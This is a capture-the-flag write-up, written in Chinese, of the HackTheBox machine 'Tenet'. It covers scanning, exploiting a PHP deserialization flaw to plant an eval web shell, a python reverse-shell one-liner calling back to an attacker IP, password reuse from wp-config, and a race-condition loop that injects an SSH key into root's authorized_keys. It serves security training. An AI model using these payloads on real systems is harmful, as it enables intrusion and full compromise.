# HackTheBox-Tenet

  
  
&lt;!--more--&gt;  
```bash  
sudo nmap --min-rate 10000 -A -sS 10.129.210.162  
  
Host is up (0.15s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)  
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)  
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
Device type: firewall  
Running (JUST GUESSING): Fortinet embedded (94%)  
OS CPE: cpe:/h:fortinet:fortigate_100d  
Aggressive OS guesses: Fortinet FortiGate 100D firewall (94%), Fortinet FortiGate-50B or 310B firewall (89%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 80/tcp)  
HOP RTT       ADDRESS  
1   367.08 ms 10.10.16.1  
2   367.04 ms 10.129.210.162  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 119.63 seconds  
```  
`80`端口存在一个`Apache`默认页面  
利用`dirsearch`扫描，扫描到一个`wordpress`目录  
将域名添加到`host 10.129.210.162 tenet.htb`  
通过网站文章得知  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404162151396.png)
存在`sator.php.bak`文件  
```php  
&lt;?php  
  
class DatabaseExport  
{  
	public $user_file = &#39;users.txt&#39;;  
	public $data = &#39;&#39;;  
  
	public function update_db()  
	{  
		echo &#39;[&#43;] Grabbing users from text file &lt;br&gt;&#39;;  
		$this-&gt; data = &#39;Success&#39;;  
	}  
  
  
	public function __destruct()  
	{  
		file_put_contents(__DIR__ . &#39;/&#39; . $this -&gt;user_file, $this-&gt;data);  
		echo &#39;[] Database updated &lt;br&gt;&#39;;  
	//	echo &#39;Gotta get this working properly...&#39;;  
	}  
}  
  
$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;  
$databaseupdate = unserialize($input);  
  
$app = new DatabaseExport;  
$app -&gt; update_db();  
  
  
?&gt;  
```  
很明显存在反序列化漏洞  
构造`poc`  
```php  
&lt;?php  
  
class DatabaseExport  
{  
	public $user_file = &#39;users.txt&#39;;  
	public $data = &#39;&#39;;  
  
    public function __construct(){  
        $this-&gt;user_file=&#34;shell.php&#34;;  
        $this-&gt;data=&#34;&lt;?php eval(\$_REQUEST[1]);?&gt;&#34;;  
    }  
}  
$o = new DatabaseExport();  
echo urlencode(serialize($o));  
  
?&gt;  
```  
访问`shell.php`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404162157835.png)
利用`python3`反弹`shell`  
`?1=system(&#39;export RHOST=&#34;10.10.16.6&#34;;export RPORT=1234;python3 -c \&#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/bash&#34;)\&#39;&#39;);`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404162201096.png)
收集数据库账号和密码  
```php  
define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );  
  
/** MySQL database username */  
define( &#39;DB_USER&#39;, &#39;neil&#39; );  
  
/** MySQL database password */  
define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; );  
  
/** MySQL hostname */  
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );  
  
/** Database Charset to use in creating database tables. */  
define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );  
```  
通过`/etc/passwd`得知存在`neil`账户，利用密码复用  
成功登陆  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404162204331.png)
打开`user.txt`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404162205224.png)
`sudo -l`查看一下权限  
```  
Matching Defaults entries for neil on tenet:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:  
  
User neil may run the following commands on tenet:  
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh  
```  
可以`root`权限运行`/usr/local/bin/enableSSH.sh`文件  
文件的大概代码逻辑就是向`tmp`目录中写入公钥文件名为`tmp-xxx`接着在写入到`/root/.ssh/authorized_keys`中，  
这里利用条件竞争写入，先本地生成密钥后写入  
```bash  
while true  
do  
echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBi/2i5Ihf1Lov/drxsMhcW6JC3&#43;I1kYSyBwFLfjxjZU&#43;g31osMQA9OD6FqLbCZY02jNCdrp2lZScRHGIjzLixG&#43;zu5mUdQ4HIEuZ9xU8alaVtgPYocBSgLaB/A/&#43;7B9Tws/30aEw8PXa0Dpiku0j7q84Rx2oIAV41WSZjmEaIhs01Wmai3kDnFzrjiZFA1gaq0TH&#43;QzR0EYllYKbPqQScSQc2WPPlawcp&#43;EHIEMooH&#43;3EAPO9BDcORxMRM8nCfEFXKYPMeSXsb7nfCr1C/ERKTQ85DK0pY9C&#43;URS8jjntti8BInStiBi24mSNHo2HEhPkHc0zGBga5VPiiRXRggZGISjx5rvn3182RujljlJX/lRIKLpKzcpFqXavDChCXfBaEz1qBAMSimfaMTrijzLKTW62x4KsvhZo0BgWowJxjXA1kI/mmOuYrmI3Gglh40M/hexcvLQjvPQvoCYtdqKSRgOwti8XdYHz/gnpEIjDBAW2bH3hUNZPcfag9AZIiek= root@ubuntu&#39;|tee /tmp/ssh-*  
done  
```  
接着运行`/usr/local/bin/enableSSH.sh`文件  
`ssh root@10.129.210.162 -p 22 -i id_rsa`  
成功登陆  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404162247477.png)

---

> Author: N1Rvana  
> URL: http://localhost:1313/hackthebox-tenet/  

